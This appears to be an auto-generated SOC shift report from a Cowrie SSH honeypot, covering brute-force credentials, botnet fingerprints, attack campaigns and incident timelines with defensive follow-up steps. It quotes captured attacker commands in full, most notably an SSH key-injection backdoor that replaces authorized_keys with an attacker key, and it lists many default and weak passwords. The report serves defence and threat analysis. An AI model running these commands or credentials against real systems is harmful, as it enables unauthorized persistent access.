# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-28 |
| **Generated At** | 2026-07-28T23:04:11Z |
| **Shift Time** | 23:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **212** |
| Confirmed Threats | **191** |
| False Positives Filtered | **21** (9.9%) |
| Unique Attacker IPs | **77** |
| Countries of Origin | **30** |
| High Severity Cases | **109** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **103** |
| Malware Samples Analyzed | **4** HIGH · **29** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **126** |
| Unique Credential Pairs | **85** |
| Unique Usernames | **13** |
| Unique Passwords | **61** |
| Successful Auth Pairs | **116** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `admin` | 28 |
| `test` | 17 |
| `user` | 14 |
| `support` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 9 |
| `11` | 6 |
| `6` | 6 |
| `6666` | 5 |
| `support` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 8 |
| `support` | `11` | 6 |
| `test` | `6` | 6 |
| `support` | `support` | 4 |
| `default` | `6666` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `test` | `888` | `49.124.149.54` | 2026-07-28T21:04:44 |
| `test` | `888` | `10.0.0.73` | 2026-07-28T21:05:03 |
| `deploy` | `87654321` | `181.214.140.22` | 2026-07-28T21:05:41 |
| `345gs5662d34` | `345gs5662d34` | `181.214.140.22` | 2026-07-28T21:05:43 |
| `deploy` | `3245gs5662d34` | `181.214.140.22` | 2026-07-28T21:05:43 |
| `admin` | `admin` | `103.186.167.42` | 2026-07-28T21:08:22 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-28T21:08:23 |
| `root` | `1qaz@WSX!@#` | `43.157.200.91` | 2026-07-28T21:10:01 |
| `345gs5662d34` | `345gs5662d34` | `43.157.200.91` | 2026-07-28T21:10:05 |
| `root` | `3245gs5662d34` | `43.157.200.91` | 2026-07-28T21:10:07 |
| `default` | `6666` | `37.238.45.202` | 2026-07-28T21:13:13 |
| `admin` | `7` | `24.142.170.231` | 2026-07-28T21:15:27 |
| `default` | `6666` | `39.164.91.67` | 2026-07-28T21:16:36 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-28T21:16:39 |
| `default` | `6666` | `111.17.213.162` | 2026-07-28T21:16:46 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-28T21:17:44 |
| `admin` | `7` | `10.0.0.73` | 2026-07-28T21:19:05 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-28T21:20:14 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-28T21:20:14 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-28T21:20:19 |
| `support` | `support` | `176.53.159.196` | 2026-07-28T21:21:09 |
| `support` | `11` | `197.251.193.6` | 2026-07-28T21:25:35 |
| `support` | `11` | `178.178.194.131` | 2026-07-28T21:25:46 |
| `support` | `11` | `122.187.227.145` | 2026-07-28T21:28:59 |
| `support` | `11` | `111.70.29.158` | 2026-07-28T21:29:12 |
| `support` | `11` | `10.0.0.73` | 2026-07-28T21:29:15 |
| `root` | `admin` | `193.32.162.15` | 2026-07-28T21:33:13 |
| `root` | `password` | `193.32.162.15` | 2026-07-28T21:34:43 |
| `unknown` | `6666` | `65.20.191.231` | 2026-07-28T21:37:21 |
| `unknown` | `6666` | `182.75.197.174` | 2026-07-28T21:37:30 |
| `root` | `toor` | `193.32.162.15` | 2026-07-28T21:37:39 |
| `root` | `qwerty` | `193.32.162.15` | 2026-07-28T21:39:06 |
| `test` | `6` | `111.70.11.38` | 2026-07-28T21:39:42 |
| `test` | `6` | `42.200.60.186` | 2026-07-28T21:39:52 |
| `root` | `12345` | `193.32.162.15` | 2026-07-28T21:40:30 |
| `root` | `letmein` | `193.32.162.15` | 2026-07-28T21:41:52 |
| `test` | `6` | `61.145.163.164` | 2026-07-28T21:43:08 |
| `root` | `123456789` | `193.32.162.15` | 2026-07-28T21:43:14 |
| `test` | `6` | `103.83.23.169` | 2026-07-28T21:43:16 |
| `test` | `6` | `10.0.0.73` | 2026-07-28T21:43:31 |
| `root` | `admin123` | `193.32.162.15` | 2026-07-28T21:44:34 |
| `root` | `welcome` | `193.32.162.15` | 2026-07-28T21:45:55 |
| `root` | `P@ssw0rd` | `193.32.162.15` | 2026-07-28T21:47:16 |
| `root` | `passw0rd` | `193.32.162.15` | 2026-07-28T21:48:41 |
| `debian` | `1111111` | `14.54.22.11` | 2026-07-28T21:49:44 |
| `root` | `root123` | `193.32.162.15` | 2026-07-28T21:50:06 |
| `root` | `alpine` | `193.32.162.15` | 2026-07-28T21:51:30 |
| `root` | `changeme` | `193.32.162.15` | 2026-07-28T21:52:58 |
| `root` | `default` | `193.32.162.15` | 2026-07-28T21:54:22 |
| `root` | `r00t` | `193.32.162.15` | 2026-07-28T21:55:48 |
| `root` | `root@123` | `193.32.162.15` | 2026-07-28T21:57:12 |
| `root` | `Root123` | `193.32.162.15` | 2026-07-28T21:58:36 |
| `root` | `!root` | `193.32.162.15` | 2026-07-28T22:00:00 |
| `root` | `rootme` | `193.32.162.15` | 2026-07-28T22:01:26 |
| `debian` | `44444` | `114.30.180.58` | 2026-07-28T22:01:37 |
| `debian` | `44444` | `195.222.57.190` | 2026-07-28T22:01:44 |
| `admin` | `admin` | `193.32.162.15` | 2026-07-28T22:02:53 |
| `admin` | `password` | `193.32.162.15` | 2026-07-28T22:04:20 |
| `admin` | `123456` | `193.32.162.15` | 2026-07-28T22:05:44 |
| `admin` | `CalVxePV1!` | `94.154.43.210` | 2026-07-28T22:06:40 |
| `admin` | `admin123` | `193.32.162.15` | 2026-07-28T22:07:12 |
| `ubuntu` | `987654321` | `69.126.144.30` | 2026-07-28T22:07:20 |
| `ubuntu` | `987654321` | `220.78.182.74` | 2026-07-28T22:07:29 |
| `ubuntu` | `987654321` | `10.0.0.73` | 2026-07-28T22:07:45 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-28T22:08:10 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-28T22:08:10 |
| `admin` | `letmein` | `193.32.162.15` | 2026-07-28T22:08:39 |
| `admin` | `qwerty` | `193.32.162.15` | 2026-07-28T22:10:01 |
| `admin` | `12345` | `193.32.162.15` | 2026-07-28T22:11:20 |
| `admin` | `admin@123` | `193.32.162.15` | 2026-07-28T22:12:39 |
| `admin` | `Admin123` | `193.32.162.15` | 2026-07-28T22:14:00 |
| `admin` | `P@ssw0rd` | `193.32.162.15` | 2026-07-28T22:15:26 |
| `admin` | `welcome` | `193.32.162.15` | 2026-07-28T22:16:48 |
| `unknown` | `unknown999` | `196.216.81.126` | 2026-07-28T22:17:28 |
| `unknown` | `unknown999` | `10.0.0.73` | 2026-07-28T22:17:51 |
| `admin` | `passw0rd` | `193.32.162.15` | 2026-07-28T22:18:07 |
| `admin` | `administrator` | `193.32.162.15` | 2026-07-28T22:19:28 |
| `admin` | `adminroot` | `193.32.162.15` | 2026-07-28T22:20:55 |
| `admin` | `adminadmin` | `193.32.162.15` | 2026-07-28T22:22:26 |
| `user` | `user` | `193.32.162.15` | 2026-07-28T22:24:00 |
| `user` | `password` | `193.32.162.15` | 2026-07-28T22:25:28 |
| `admin` | `3333333` | `121.128.84.224` | 2026-07-28T22:25:32 |
| `admin` | `3333333` | `39.164.91.67` | 2026-07-28T22:25:41 |
| `support` | `support` | `10.0.0.73` | 2026-07-28T22:25:48 |
| `admin` | `admin` | `43.155.172.154` | 2026-07-28T22:26:27 |
| `user` | `123456` | `193.32.162.15` | 2026-07-28T22:26:49 |
| `user` | `qwerty` | `193.32.162.15` | 2026-07-28T22:28:09 |
| `debian` | `debian111` | `65.20.179.251` | 2026-07-28T22:28:14 |
| `debian` | `debian111` | `41.214.10.178` | 2026-07-28T22:28:25 |
| `user` | `12345` | `193.32.162.15` | 2026-07-28T22:29:32 |
| `user` | `letmein` | `193.32.162.15` | 2026-07-28T22:30:53 |
| `debian` | `debian111` | `31.41.84.98` | 2026-07-28T22:31:36 |
| `user` | `welcome` | `193.32.162.15` | 2026-07-28T22:32:09 |
| `user` | `passw0rd` | `193.32.162.15` | 2026-07-28T22:33:27 |
| `user` | `user123` | `193.32.162.15` | 2026-07-28T22:34:51 |
| `user` | `user1` | `193.32.162.15` | 2026-07-28T22:36:16 |
| `user` | `userpass` | `193.32.162.15` | 2026-07-28T22:37:41 |
| `user` | `user@123` | `193.32.162.15` | 2026-07-28T22:39:03 |
| `user` | `User123` | `193.32.162.15` | 2026-07-28T22:40:25 |
| `blank` | `1` | `10.0.0.73` | 2026-07-28T22:41:47 |
| `user` | `guest` | `193.32.162.15` | 2026-07-28T22:41:47 |
| `test` | `test` | `193.32.162.15` | 2026-07-28T22:43:06 |
| `test` | `password` | `193.32.162.15` | 2026-07-28T22:44:24 |
| `test` | `123456` | `193.32.162.15` | 2026-07-28T22:45:41 |
| `test` | `test123` | `193.32.162.15` | 2026-07-28T22:46:59 |
| `test` | `qwerty` | `193.32.162.15` | 2026-07-28T22:48:20 |
| `test` | `12345` | `193.32.162.15` | 2026-07-28T22:49:43 |
| `default` | `default555` | `111.70.29.158` | 2026-07-28T22:49:47 |
| `default` | `default555` | `211.169.212.206` | 2026-07-28T22:49:55 |
| `admin` | `admin` | `27.72.98.85` | 2026-07-28T22:50:53 |
| `test` | `test@123` | `193.32.162.15` | 2026-07-28T22:51:07 |
| `test` | `Test123` | `193.32.162.15` | 2026-07-28T22:52:32 |
| `administrator` | `default` | `195.218.159.123` | 2026-07-28T22:52:32 |
| `administrator` | `default` | `200.89.159.59` | 2026-07-28T22:52:44 |
| `default` | `default555` | `10.0.0.73` | 2026-07-28T22:53:14 |
| `test` | `testing` | `193.32.162.15` | 2026-07-28T22:53:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **212** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 66 |
| OpenSSH | 31 |
| libssh | 17 |
| Paramiko (Python) | 6 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 60 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 31 | 29 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `a2de0f306611...` | Mirai/variant | 6 | 2 |
| `19532158b559...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 60 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 31 | 29 | Mirai/variant |
| `95420f9d932d...` | libssh | 9 | 5 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 6 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |
| `bf7dbf67fa9b...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 58 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.15`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `43.157.200.91`, `181.214.140.22`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **77** |
| Unique ASNs | **56** |
| High-Risk ASNs | **47** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS35042` | Layer7 Networks GmbH | 2 | HIGH |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (109)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d0c927806cfc

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]54` |
| **First Seen** | 2026-07-28 21:04 |
| **Last Seen** | 2026-07-28 21:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:04:42` | `cowrie.session.connect` |
| `2026-07-28 21:04:42` | `cowrie.client.version` |
| `2026-07-28 21:04:42` | `cowrie.client.kex` |
| `2026-07-28 21:04:44` | `cowrie.login.success` |
| `2026-07-28 21:04:45` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:04:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]54` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-104a0a6aa596

| Field | Detail |
|---|---|
| **Source IP** | `181.214.140[.]22` |
| **First Seen** | 2026-07-28 21:05 |
| **Last Seen** | 2026-07-28 21:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:05:40` | `cowrie.session.connect` |
| `2026-07-28 21:05:40` | `cowrie.client.version` |
| `2026-07-28 21:05:40` | `cowrie.client.kex` |
| `2026-07-28 21:05:41` | `cowrie.login.success` |
| `2026-07-28 21:05:41` | `cowrie.session.params` |
| `2026-07-28 21:05:41` | `cowrie.command.input` |
| `2026-07-28 21:05:41` | `cowrie.command.failed` |
| `2026-07-28 21:05:41` | `cowrie.log.closed` |
| `2026-07-28 21:05:42` | `cowrie.session.params` |
| `2026-07-28 21:05:42` | `cowrie.command.input` |
| `2026-07-28 21:05:42` | `cowrie.session.file_download` |
| `2026-07-28 21:05:42` | `cowrie.log.closed` |
| `2026-07-28 21:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.214.140[.]22` to AbuseIPDB if not already reported
- [ ] Block `181.214.140[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37a7851cb942

| Field | Detail |
|---|---|
| **Source IP** | `181.214.140[.]22` |
| **First Seen** | 2026-07-28 21:05 |
| **Last Seen** | 2026-07-28 21:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:05:42` | `cowrie.session.connect` |
| `2026-07-28 21:05:42` | `cowrie.client.version` |
| `2026-07-28 21:05:42` | `cowrie.client.kex` |
| `2026-07-28 21:05:43` | `cowrie.login.success` |
| `2026-07-28 21:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.214.140[.]22` to AbuseIPDB if not already reported
- [ ] Block `181.214.140[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9e4f44eff6a

| Field | Detail |
|---|---|
| **Source IP** | `181.214.140[.]22` |
| **First Seen** | 2026-07-28 21:05 |
| **Last Seen** | 2026-07-28 21:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:05:43` | `cowrie.session.connect` |
| `2026-07-28 21:05:43` | `cowrie.client.version` |
| `2026-07-28 21:05:43` | `cowrie.client.kex` |
| `2026-07-28 21:05:43` | `cowrie.login.success` |
| `2026-07-28 21:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.214.140[.]22` to AbuseIPDB if not already reported
- [ ] Block `181.214.140[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe3b04c5ceb

| Field | Detail |
|---|---|
| **Source IP** | `103.186.167[.]42` |
| **First Seen** | 2026-07-28 21:08 |
| **Last Seen** | 2026-07-28 21:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:08:20` | `cowrie.session.connect` |
| `2026-07-28 21:08:20` | `cowrie.client.version` |
| `2026-07-28 21:08:20` | `cowrie.client.kex` |
| `2026-07-28 21:08:22` | `cowrie.login.success` |
| `2026-07-28 21:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.186.167[.]42` to AbuseIPDB if not already reported
- [ ] Block `103.186.167[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d2f98b650da

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-28 21:08 |
| **Last Seen** | 2026-07-28 21:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:08:22` | `cowrie.session.connect` |
| `2026-07-28 21:08:22` | `cowrie.client.version` |
| `2026-07-28 21:08:22` | `cowrie.client.kex` |
| `2026-07-28 21:08:23` | `cowrie.login.success` |
| `2026-07-28 21:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-589967733e69

| Field | Detail |
|---|---|
| **Source IP** | `43.157.200[.]91` |
| **First Seen** | 2026-07-28 21:09 |
| **Last Seen** | 2026-07-28 21:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:09:59` | `cowrie.session.connect` |
| `2026-07-28 21:09:59` | `cowrie.client.version` |
| `2026-07-28 21:10:00` | `cowrie.client.kex` |
| `2026-07-28 21:10:01` | `cowrie.login.success` |
| `2026-07-28 21:10:02` | `cowrie.session.params` |
| `2026-07-28 21:10:02` | `cowrie.command.input` |
| `2026-07-28 21:10:02` | `cowrie.command.failed` |
| `2026-07-28 21:10:02` | `cowrie.log.closed` |
| `2026-07-28 21:10:03` | `cowrie.session.params` |
| `2026-07-28 21:10:03` | `cowrie.command.input` |
| `2026-07-28 21:10:04` | `cowrie.session.file_download` |
| `2026-07-28 21:10:04` | `cowrie.log.closed` |
| `2026-07-28 21:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.200[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.157.200[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f67eb3de21ab

| Field | Detail |
|---|---|
| **Source IP** | `43.157.200[.]91` |
| **First Seen** | 2026-07-28 21:10 |
| **Last Seen** | 2026-07-28 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:10:04` | `cowrie.session.connect` |
| `2026-07-28 21:10:04` | `cowrie.client.version` |
| `2026-07-28 21:10:04` | `cowrie.client.kex` |
| `2026-07-28 21:10:05` | `cowrie.login.success` |
| `2026-07-28 21:10:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.200[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.157.200[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e99da53bfa3

| Field | Detail |
|---|---|
| **Source IP** | `43.157.200[.]91` |
| **First Seen** | 2026-07-28 21:10 |
| **Last Seen** | 2026-07-28 21:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:10:06` | `cowrie.session.connect` |
| `2026-07-28 21:10:06` | `cowrie.client.version` |
| `2026-07-28 21:10:06` | `cowrie.client.kex` |
| `2026-07-28 21:10:07` | `cowrie.login.success` |
| `2026-07-28 21:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.157.200[.]91` to AbuseIPDB if not already reported
- [ ] Block `43.157.200[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949665a3a546

| Field | Detail |
|---|---|
| **Source IP** | `37.238.45[.]202` |
| **First Seen** | 2026-07-28 21:13 |
| **Last Seen** | 2026-07-28 21:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:13:12` | `cowrie.session.connect` |
| `2026-07-28 21:13:12` | `cowrie.client.version` |
| `2026-07-28 21:13:12` | `cowrie.client.kex` |
| `2026-07-28 21:13:13` | `cowrie.login.success` |
| `2026-07-28 21:13:14` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:13:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.238.45[.]202` to AbuseIPDB if not already reported
- [ ] Block `37.238.45[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ab12abddbc7

| Field | Detail |
|---|---|
| **Source IP** | `24.142.170[.]231` |
| **First Seen** | 2026-07-28 21:15 |
| **Last Seen** | 2026-07-28 21:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:15:26` | `cowrie.session.connect` |
| `2026-07-28 21:15:26` | `cowrie.client.version` |
| `2026-07-28 21:15:26` | `cowrie.client.kex` |
| `2026-07-28 21:15:27` | `cowrie.login.success` |
| `2026-07-28 21:15:28` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.142.170[.]231` to AbuseIPDB if not already reported
- [ ] Block `24.142.170[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9526f7567f

| Field | Detail |
|---|---|
| **Source IP** | `39.164.91[.]67` |
| **First Seen** | 2026-07-28 21:16 |
| **Last Seen** | 2026-07-28 21:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
